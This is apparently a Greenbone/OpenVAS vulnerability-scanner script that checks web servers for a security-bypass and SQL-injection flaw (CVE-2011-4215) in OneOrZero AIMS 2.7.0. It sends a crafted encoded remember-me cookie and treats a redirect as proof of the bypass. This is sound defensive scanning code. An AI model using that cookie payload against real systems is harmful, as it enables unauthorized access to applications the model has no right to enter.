if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103304" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-10-18 13:33:12 +0200 (Tue, 18 Oct 2011)" );
	script_cve_id( "CVE-2011-4215" );
	script_bugtraq_id( 50107 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "OneOrZero AIMS Security Bypass and SQL Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50107" );
	script_xref( name: "URL", value: "http://en.securitylab.ru/lab/PT-2011-20" );
	script_xref( name: "URL", value: "http://en.securitylab.ru/lab/PT-2011-21" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/800227" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "OneOrZero AIMS is prone to a security-bypass vulnerability and an SQL-
  injection vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to bypass certain security
  restrictions, perform unauthorized actions, bypass filtering, and modify the logic of SQL queries." );
	script_tag( name: "affected", value: "OneOrZero AIMS 2.7.0 is affected. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/ooz", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(ContainsString( buf, "Powered by OneOrZero" )){
		host = http_host_name( port: port );
		req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: oozimsrememberme=eJwrtjI0tlJKTMnNzMssLilKLMkvUrJ29PQNBgBsjwh2;\\r\\n", "\\r\\n\\r\\n" );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, "Location: ?controller=launch" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

